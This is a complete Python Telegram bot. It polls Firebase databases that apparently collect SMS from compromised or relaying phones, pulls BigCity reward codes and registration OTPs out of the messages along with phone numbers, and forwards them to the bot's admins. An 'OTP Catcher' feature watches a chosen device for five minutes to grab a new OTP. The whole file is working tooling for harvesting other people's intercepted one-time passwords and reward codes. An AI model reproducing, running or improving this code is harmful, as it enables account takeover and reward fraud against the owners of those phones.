"""
BigCity Firebase Monitor Bot (Final Premium)
"""
import asyncio
import json
import os
import re
import sys
import time
import logging
import httpx
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from telegram import (
    InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, Update,
)
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID_ENV = os.environ.get("ADMIN_ID", "").strip()

STATE_FILE = Path(__file__).parent / "bot_state.json"
ADMINS_FILE = Path(__file__).parent / "admins.json"
PANELS_FILE = Path(__file__).parent / "panels.json"

IS_INITIALIZED = False
MAX_CONCURRENT = 30
semaphore = asyncio.Semaphore(MAX_CONCURRENT)
OTP_WATCH_SECONDS = 300
API_TIMEOUT = 8
MONITOR_INTERVAL = 12

# ─── MESSAGE PATTERNS (BigCity only) ─────────────────────────────────────────
REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{4,8})", re.IGNORECASE)
BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)

# ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────

def load_json(path, default):
    try:
        if path.exists():
            with open(path) as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"load {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"save {path}: {e}")

def load_panels(): return load_json(PANELS_FILE, {})
def save_panels(p): save_json(PANELS_FILE, p)
def load_state(): return load_json(STATE_FILE, {})
def save_state(s): save_json(STATE_FILE, s)

# ─── ADMIN MANAGEMENT ────────────────────────────────────────────────────────

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if ADMIN_ID_ENV.isdigit() and int(ADMIN_ID_ENV) not in admins:
        admins.append(int(ADMIN_ID_ENV))
    return admins

def save_admins(admins):
    save_json(ADMINS_FILE, list(set(admins)))

def is_admin(cid: int):
    admins = get_admins()
    if not admins:
        save_admins([cid])
        logger.info(f"New Admin assigned: {cid}")
        return True
    return cid in admins

# ─── FIREBASE URL PARSER ─────────────────────────────────────────────────────

def parse_firebase_link(link: str):
    try:
        p = urlparse(link.strip())
        host = p.netloc.lower()
        if "firebaseio.com" not in host and "firebasedatabase.app" not in host:
            return None
        return f"{p.scheme}://{p.netloc}".rstrip("/")
    except Exception:
        return None

# ─── API HELPERS ─────────────────────────────────────────────────────────────

async def api_get(client, url, timeout=API_TIMEOUT):
    async with semaphore:
        try:
            r = await client.get(url, timeout=timeout)
            if r.status_code == 200:
                return r.json(), None
            return None, f"HTTP {r.status_code}"
        except Exception as e:
            return None, str(e)[:80]

def is_device_id(k: str) -> bool:
    if not isinstance(k, str): return False
    if k.lower() in {"messages","clients","devices","users","all_devices",
                      "nodes","settings","sms","logs","status","info","admin","config"}:
        return False
    return 6 <= len(k) <= 60

async def discover_structure(client, base):
    root, _ = await api_get(client, f"{base}/.json?shallow=true", 10)
    if not isinstance(root, dict):
        return None, None
        
    keys = list(root.keys())
    for c in ("clients", "devices", "users", "all_devices", "nodes"):
        if c in keys:
            sub, _ = await api_get(client, f"{base}/{c}.json?shallow=true", 10)
            if isinstance(sub, dict) and any(is_device_id(k) for k in sub.keys()):
                msg = c
                for m in ("messages", "sms", "logs"):
                    if m in keys: 
                        msg = m
                        break
                return c, msg

    if any(is_device_id(k) for k in keys):
        msg = ""
        for c in ("messages", "sms", "logs"):
            if c in keys: 
                msg = c
                break
        return "", msg
    return None, None

def device_is_online(d: dict) -> bool:
    if not isinstance(d, dict): return False
    for f in ("online", "isOnline", "active", "connected", "status", "state"):
        if f in d:
            v = str(d[f]).lower()
            if v in ("true", "online", "1", "yes", "active", "connected"):
                return True
            if v in ("false", "offline", "0", "no", "inactive"):
                return False
    now = time.time() * 1000
    for f in ("lastSeen", "lastActive", "last_seen", "last_active", "timestamp", "updatedAt", "time"):
        if f in d:
            v = d[f]
            ts = None
            if isinstance(v, (int, float)): 
                ts = v if v > 1e12 else v * 1000
            elif isinstance(v, str) and v.isdigit():
                n = int(v)
                ts = n if n > 1e12 else n * 1000
            if ts and (now - ts) < 10 * 60 * 1000:
                return True
    return False

# ─── NUMBER EXTRACTOR (FIXED - NO SENDER FALLBACK) ───────────────────────────
def _extract_number(d: dict) -> str:
    """Device JSON ke andar se phone number nikalta hai."""
    if not isinstance(d, dict):
        return ""

    # 1. Check direct known fields
    for f in ("number", "phoneNumber", "phone", "fromNumber", "sim_number", "to", "mobile"):
        if f in d and d[f]:
            val = str(d[f]).strip()
            clean_val = re.sub(r'\D', '', val)
            if len(clean_val) >= 7 and len(clean_val) <= 15:
                return val

    # 2. Deep search inside nested folders (webhookEvent, info, etc.)
    for k, v in d.items():
        if isinstance(v, dict):
            res = _extract_number(v)
            if res:
                return res

    return ""

def _extract_number_from_msg(text: str) -> str:
    """Message ke text ke andar se 10-digit mobile number nikalta hai."""
    if not text: return ""
    # Find 10 to 12 digit numbers (Indian mobile numbers)
    matches = re.findall(r'\b(?:\+?91[\-\s]?)?([6-9]\d{9})\b', text)
    if matches:
        return matches[0]
    return ""

async def fetch_online_devices(client, base, dev_node):
    path = f"/{dev_node}" if dev_node else ""
    data, _ = await api_get(client, f"{base}{path}.json", 15)
    if not isinstance(data, dict): return []
    
    out = []
    for did, dd in data.items():
        if not is_device_id(did) or not isinstance(dd, dict): continue
        if device_is_online(dd):
            out.append((did, _extract_number(dd)))
    return out

async def fetch_last_messages(client, base, msg_node, dev_id, limit=6):
    path = f"/{msg_node}" if msg_node else ""
    url = f'{base}{path}/{dev_id}.json?orderBy="%24key"&limitToLast={limit}'
    data, _ = await api_get(client, url, 10)
    return data if isinstance(data, dict) else {}

def classify_bigcity(text: str):
    if not text or not BIGCITY_HINT.search(text):
        return None, None
    m = REWARD_PATTERN.search(text)
    if m: return "reward", m.group(1)
    m = OTP_PATTERN.search(text)
    if m: return "otp", m.group(1)
    return None, None

def extract_sender_time(md: dict):
    sender = "Unknown"
    for f in ("sender","from","address","number","fromNumber"):
        if f in md and md[f]: sender = str(md[f]); break
    dt = md.get("dateTime", md.get("time", md.get("timestamp","")))
    if isinstance(dt, (int, float)):
        try:
            dt = datetime.fromtimestamp(dt/1000 if dt>1e12 else dt).strftime("%Y-%m-%d %H:%M:%S")
        except Exception: dt = str(dt)
    return sender, str(dt)

def extract_text(md: dict):
    for f in ("message","body","text","msg","SMS","content"):
        if f in md and md[f]: return str(md[f])
    return ""

# ─── PREMIUM FORMATTERS ──────────────────────────────────────────────────────

def fmt_reward(panel, did, num, sender, dt, code, msg, token):
    btn = InlineKeyboardMarkup([[
        InlineKeyboardButton("🎯 OTP Catcher (5 min)", callback_data=f"otp|{token}")
    ]])
    txt = (
        "🎉 <b>BIGCITY REWARD CODE FOUND</b> 🎉\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>Panel:</b> {panel}\n"
        f"📲 <b>Device:</b> <code>{did}</code>\n"
        f"🔢 <b>Number:</b> <code>{num or 'N/A'}</code>\n"
        f"📨 <b>Sender:</b> {sender}\n"
        f"⏰ <b>Time:</b> {dt}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 <b>REWARD CODE (Tap to copy):</b>\n"
        f"👉 <code>{code}</code> 👈\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 <i>{msg}</i>"
    )
    return txt, btn

def fmt_otp(panel, did, num, sender, dt, otp, msg):
    return (
        "🔐 <b>BIGCITY OTP RECEIVED</b> 🔐\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>Panel:</b> {panel}\n"
        f"📲 <b>Device:</b> <code>{did}</code>\n"
        f"🔢 <b>Number:</b> <code>{num or 'N/A'}</code>\n"
        f"📨 <b>Sender:</b> {sender}\n"
        f"⏰ <b>Time:</b> {dt}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>OTP CODE (Tap to copy):</b>\n"
        f"👉 <code>{otp}</code> 👈\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 <i>{msg}</i>"
    )

# ─── MONITORING ──────────────────────────────────────────────────────────────

async def process_device(client, pk, pc, did, num, state, admins, app, is_new_panel):
    base = pc["base"]
    msg_node = pc.get("message_node","")
    panel = pc.get("name","Panel")
    sent = 0
    try:
        msgs = await fetch_last_messages(client, base, msg_node, did, limit=6)
        if not msgs: return 0
        for mk, md in msgs.items():
            if not isinstance(md, dict): continue
            mid = str(md.get("id", mk))
            key = f"{pk}:{did}:{mid}"
            if state.get(key): continue
            if not IS_INITIALIZED or is_new_panel:
                state[key] = True; continue
            text = extract_text(md)
            if not text:
                state[key] = True; continue
            kind, payload = classify_bigcity(text)
            if not kind:
                state[key] = True; continue
            sender, dt = extract_sender_time(md)
            
            # Number from device OR from message text (NO SENDER FALLBACK)
            actual_num = num or _extract_number_from_msg(text)
            
            if kind == "reward":
                token = f"{pk}~{did}~{int(time.time())}"
                txt, btn = fmt_reward(panel, did, actual_num, sender, dt, payload, text, token)
                for uid in admins:
                    try:
                        await asyncio.wait_for(
                            app.bot.send_message(
                                chat_id=uid, text=txt, parse_mode="HTML",
                                reply_markup=btn, disable_web_page_preview=True,
                            ), timeout=10
                        )
                    except Exception as e:
                        logger.debug(f"send {uid}: {e}")
                sent += 1
            state[key] = True
    except Exception as e:
        logger.debug(f"process {did}: {e}")
    return sent

async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
    global IS_INITIALIZED
    app = context.application
    try:
        admins = get_admins()
        if not admins: return
        panels = load_panels()
        state = load_state()
        
        total = 0; any_init = False
        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
            for pk, pc in list(panels.items()):
                base = pc.get("base")
                if not base: continue
                init_key = f"init:{pk}"
                is_new_panel = not state.get(init_key, False)
                try:
                    if pc.get("device_node") is None or pc.get("message_node") is None:
                        dn, mn = await asyncio.wait_for(
                            discover_structure(client, base), timeout=20
                        )
                        if dn is None: continue
                        pc["device_node"] = dn; pc["message_node"] = mn
                        save_panels(panels)
                    online = await asyncio.wait_for(
                        fetch_online_devices(client, base, pc.get("device_node","")),
                        timeout=25
                    )
                    if not online:
                        if is_new_panel: state[init_key] = True
                        continue
                    if is_new_panel or not IS_INITIALIZED:
                        for did, _ in online:
                            try:
                                await asyncio.wait_for(
                                    fetch_last_messages(client, base, pc.get("message_node",""), did, limit=10),
                                    timeout=15
                                )
                            except Exception: pass
                        state[init_key] = True
                        any_init = True
                        continue
                    tasks = [
                        process_device(client, pk, pc, did, num, state, admins, app, is_new_panel)
                        for did, num in online
                    ]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for r in results:
                        if isinstance(r, int): total += r
                except asyncio.TimeoutError:
                    logger.warning(f"panel {pk} timeout")
                except Exception as e:
                    logger.error(f"panel {pk}: {e}")
        if not IS_INITIALIZED:
            IS_INITIALIZED = True
            save_state(state)
            logger.info("Initialized. Baseline done.")
            return
        if total > 0 or any_init:
            save_state(state)
    except Exception as e:
        logger.error(f"monitor outer: {e}")

# ─── OTP CATCHER (WITH STOP BUTTON) ──────────────────────────────────────────

async def otp_catcher_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        if not is_admin(q.from_user.id): 
            return await q.answer("❌ Admin Only!", show_alert=True)
        await q.answer("OTP Catcher starting...")
        if not q.data.startswith("otp|"): return
        token = q.data.split("|",1)[1]
        parts = token.split("~")
        if len(parts) != 3:
            await q.edit_message_reply_markup(reply_markup=None); return
        pk, did, _ = parts
        try: await q.edit_message_reply_markup(reply_markup=None)
        except Exception: pass
        context.application.create_task(
            otp_watch(context.application, q.message.chat_id, pk, did)
        )
    except Exception as e:
        logger.error(f"otp_cb: {e}")

async def stop_otp_watch_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        if not is_admin(q.from_user.id): 
            return await q.answer("❌ Admin Only!", show_alert=True)
        if not q.data.startswith("stop_otp|"): return
        did = q.data.split("|",1)[1]
        
        task_name = f"otp_watch_{did}"
        if hasattr(context.application, 'running_tasks') and task_name in context.application.running_tasks:
            context.application.running_tasks[task_name].cancel()
            
        await q.answer("🛑 OTP Watch Stopped!", show_alert=True)
        try: 
            await q.edit_message_reply_markup(reply_markup=None)
            await q.edit_message_text(f"🛑 <b>OTP Watch manually stopped</b> for <code>{did}</code>.", parse_mode="HTML")
        except Exception: pass
    except Exception as e:
        logger.error(f"stop_otp_cb: {e}")

async def otp_watch(app, chat_id, pk, did):
    try:
        panels = load_panels()
        pc = panels.get(pk)
        if not pc:
            await app.bot.send_message(chat_id, "❌ Panel missing."); return
        base = pc["base"]; msg_node = pc.get("message_node","")
        panel = pc.get("name","Panel")
        end_at = time.time() + OTP_WATCH_SECONDS
        seen = set()
        
        stop_btn = InlineKeyboardMarkup([[
            InlineKeyboardButton("🛑 Stop OTP Watch", callback_data=f"stop_otp|{did}")
        ]])
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
            first = await fetch_last_messages(client, base, msg_node, did, limit=10)
            for mk, md in first.items():
                if isinstance(md, dict):
                    seen.add(str(md.get("id", mk)))
            
            watch_msg = await app.bot.send_message(
                chat_id,
                f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>",
                parse_mode="HTML", reply_markup=stop_btn
            )
            
            last_ping = time.time()
            while time.time() < end_at:
                try:
                    msgs = await asyncio.wait_for(
                        fetch_last_messages(client, base, msg_node, did, limit=10),
                        timeout=12
                    )
                    for mk, md in msgs.items():
                        if not isinstance(md, dict): continue
                        mid = str(md.get("id", mk))
                        if mid in seen: continue
                        seen.add(mid)
                        text = extract_text(md)
                        kind, payload = classify_bigcity(text)
                        if kind != "otp": continue
                        sender, dt = extract_sender_time(md)
                        
                        num = ""
                        try:
                            path = f"/{pc.get('device_node','')}" if pc.get("device_node") else ""
                            dd, _ = await api_get(client, f"{base}{path}/{did}.json", 6)
                            if isinstance(dd, dict): num = _extract_number(dd)
                        except Exception: pass
                        
                        # Number from device OR from message text (NO SENDER FALLBACK)
                        actual_num = num or _extract_number_from_msg(text)
                        
                        await app.bot.send_message(
                            chat_id, fmt_otp(panel, did, actual_num, sender, dt, payload, text),
                            parse_mode="HTML", disable_web_page_preview=True,
                        )
                        try: await watch_msg.edit_reply_markup(reply_markup=None)
                        except Exception: pass
                        
                        await app.bot.send_message(
                            chat_id, f"✅ <b>OTP aaya — watch band</b> (<code>{did}</code>).",
                            parse_mode="HTML"
                        )
                        return
                except Exception as e:
                    logger.debug(f"watch: {e}")
                if time.time() - last_ping > 60:
                    last_ping = time.time()
                    try:
                        await app.bot.send_message(
                            chat_id, f"⏳ OTP watch running... <code>{did}</code>",
                            parse_mode="HTML"
                        )
                    except Exception: pass
                await asyncio.sleep(8)
                
            try: await watch_msg.edit_reply_markup(reply_markup=None)
            except Exception: pass
            await app.bot.send_message(
                chat_id, f"⌛ <b>OTP watch timeout</b> (<code>{did}</code>).", parse_mode="HTML"
            )
    except asyncio.CancelledError:
        await app.bot.send_message(chat_id, f"🛑 <b>OTP Watch manually stopped</b> for <code>{did}</code>.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"otp_watch outer: {e}")

# ─── COMMANDS ────────────────────────────────────────────────────────────────

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if not is_admin(cid):
        return await update.message.reply_text("❌ Aap Admin nahi hain.")
    kb = ReplyKeyboardMarkup(
        [["📊 Status","📋 My Panels"],["➕ Add Panel","❌ Remove Panel"],["👑 Admin Panel"]],
        resize_keyboard=True,
    )
    await update.message.reply_text(
        f"🤖 <b>BigCity Firebase Monitor</b>\n\n"
        "• Firebase URL only\n"
        "• Sirf NAYE messages\n"
        "• Reward → number+code+msg\n"
        "• 🎯 OTP Catcher (5 min)\n\n"
        f"👤 <code>{cid}</code>",
        parse_mode="HTML", reply_markup=kb,
    )

async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    admins = get_admins()
    out = "👑 <b>Admin Panel</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    out += "\n".join([f"• <code>{a}</code>" for a in admins])
    out += "\n\nNaya Admin add karne ke liye <code>/addadmin ID</code> bhejo.\nRemove karne ke liye <code>/deladmin ID</code> bhejo."
    await update.message.reply_text(out, parse_mode="HTML")

async def add_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    try:
        new_id = int(context.args[0])
        admins = get_admins()
        if new_id in admins:
            return await update.message.reply_text("Yeh pehle se Admin hai.")
        admins.append(new_id)
        save_admins(admins)
        await update.message.reply_text(f"✅ <code>{new_id}</code> ko Admin bana diya gaya.", parse_mode="HTML")
    except Exception:
        await update.message.reply_text("❌ Format: <code>/addadmin 123456789</code>", parse_mode="HTML")

async def del_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    try:
        del_id = int(context.args[0])
        if str(del_id) == ADMIN_ID_ENV:
            return await update.message.reply_text("❌ Super Admin ko remove nahi kar sakte.")
        admins = get_admins()
        if del_id not in admins:
            return await update.message.reply_text("Yeh Admin nahi hai.")
        admins.remove(del_id)
        save_admins(admins)
        await update.message.reply_text(f"✅ <code>{del_id}</code> ko hata diya gaya.", parse_mode="HTML")
    except Exception:
        await update.message.reply_text("❌ Format: <code>/deladmin 123456789</code>", parse_mode="HTML")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    try:
        panels = load_panels()
        out = "📊 <b>Status</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        total = 0
        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
            for pk, pc in panels.items():
                name = pc.get("name","?")
                base = pc.get("base")
                if not base:
                    out += f"<b>{name}</b> — 🔴 no url\n"; continue
                dn = pc.get("device_node")
                if dn is None:
                    try:
                        dn, mn = await asyncio.wait_for(
                            discover_structure(client, base), timeout=15
                        )
                        if dn is not None:
                            pc["device_node"]=dn; pc["message_node"]=mn
                            save_panels(panels)
                    except Exception: pass
                if dn is None:
                    out += f"<b>{name}</b> — 🔴 structure\n"; continue
                try:
                    online = await asyncio.wait_for(
                        fetch_online_devices(client, base, dn), timeout=20
                    )
                    total += len(online)
                    out += f"<b>{name}</b> — 🟢 {len(online)} online\n"
                except Exception:
                    out += f"<b>{name}</b> — 🔴 timeout\n"
        out += f"\n📦 <b>Online:</b> {total}"
        await update.message.reply_text(out, parse_mode="HTML")
    except Exception as e:
        logger.error(f"status: {e}")
        await update.message.reply_text("❌ Status error.")

async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi."); return
    out = "📋 <b>Panels</b>\n\n"
    for i,(pk,pc) in enumerate(panels.items(),1):
        out += f"<b>{i}. {pc.get('name')}</b>\n<code>{pc.get('base','')[:50]}</code>\n\n"
    await update.message.reply_text(out, parse_mode="HTML")

async def add_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    context.user_data["awaiting_url"] = True
    await update.message.reply_text(
        "➕ <b>Firebase URL(s) bhejo</b> — ek line ek URL.\n"
        "Example:\n<code>https://abc-default-rtdb.firebaseio.com</code>",
        parse_mode="HTML",
    )

async def remove_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi."); return
    out = "❌ <b>Remove Panel</b>\n\n"
    pl = []
    for i,(pk,pc) in enumerate(panels.items(),1):
        out += f"{i}. {pc.get('name')}\n"
        pl.append(pk)
    out += "\n<i>Number(s) bhejo. Multiple remove karne ke liye space ya comma ( , ) lagao.</i>\n"
    out += "<i>Example: 1, 2</i>\n"
    out += "<i>All remove karne ke liye /removeall bhejo.</i>"
    context.user_data["awaiting_remove"] = True
    context.user_data["panels_list"] = pl
    await update.message.reply_text(out, parse_mode="HTML")

async def remove_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    save_panels({})
    await update.message.reply_text("✅ <b>Saare panels remove ho gaye.</b>", parse_mode="HTML")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_chat.id): return
    try:
        text = (update.message.text or "").strip()
        if context.user_data.get("awaiting_url"):
            context.user_data["awaiting_url"] = False
            lines = [l.strip() for l in text.splitlines() if l.strip()]
            panels = load_panels()
            added = 0; failed = []
            async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
                for link in lines:
                    base = parse_firebase_link(link)
                    if not base:
                        failed.append(f"{link[:40]} (invalid)"); continue
                    try:
                        dn, mn = await asyncio.wait_for(
                            discover_structure(client, base), timeout=15
                        )
                    except Exception:
                        dn, mn = None, None
                    if dn is None:
                        failed.append(f"{link[:40]} (structure)"); continue
                    pid = f"p_{int(time.time())}_{added}"
                    panels[pid] = {
                        "name": f"Panel {len(panels)+1}",
                        "base": base,
                        "device_node": dn,
                        "message_node": mn,
                        "panel_url": link,
                        "added_date": datetime.now().strftime("%Y-%m-%d"),
                    }
                    added += 1
            save_panels(panels)
            msg = f"✅ {added} panel add."
            if failed: msg += "\n\n❌ Failed:\n" + "\n".join(failed[:10])
            await update.message.reply_text(msg)
            return
        if context.user_data.get("awaiting_remove"):
            context.user_data["awaiting_remove"] = False
            pl = context.user_data.get("panels_list", [])
            panels = load_panels()
            removed_count = 0
            
            raw_nums = re.split(r'[,\s]+', text)
            idxs = []
            for n in raw_nums:
                if n.isdigit():
                    idx = int(n) - 1
                    if 0 <= idx < len(pl):
                        idxs.append(idx)
            
            for idx in sorted(set(idxs), reverse=True):
                rm = panels.pop(pl[idx], None)
                if rm:
                    removed_count += 1
            
            save_panels(panels)
            if removed_count > 0:
                await update.message.reply_text(f"✅ <b>{removed_count} panel(s) removed.</b>", parse_mode="HTML")
            else:
                await update.message.reply_text("❌ Koi valid number nahi mila.")
            return
    except Exception as e:
        logger.error(f"handle_text: {e}")

# ─── MAIN ────────────────────────────────────────────────────────────────────

async def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN missing!"); sys.exit(1)
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("addadmin", add_admin_command))
    app.add_handler(CommandHandler("deladmin", del_admin_command))
    app.add_handler(CommandHandler("removeall", remove_all_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(📊 Status|Status)$"), status_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(📋 My Panels|My Panels)$"), my_panels_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(➕ Add Panel|Add Panel)$"), add_panel_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(❌ Remove Panel|Remove Panel)$"), remove_panel_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(👑 Admin Panel|Admin Panel)$"), admin_panel_command))
    
    app.add_handler(CallbackQueryHandler(otp_catcher_cb, pattern=r"^otp\|"))
    app.add_handler(CallbackQueryHandler(stop_otp_watch_cb, pattern=r"^stop_otp\|"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    app.job_queue.run_repeating(
        monitor_panels,
        interval=MONITOR_INTERVAL,
        first=8,
        job_kwargs={"max_instances": 1, "coalesce": True, "misfire_grace_time": 10},
    )
    
    logger.info("Bot starting...")
    async with app:
        await app.initialize()
        await app.start()
        await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        logger.fatal(f"Fatal: {e}")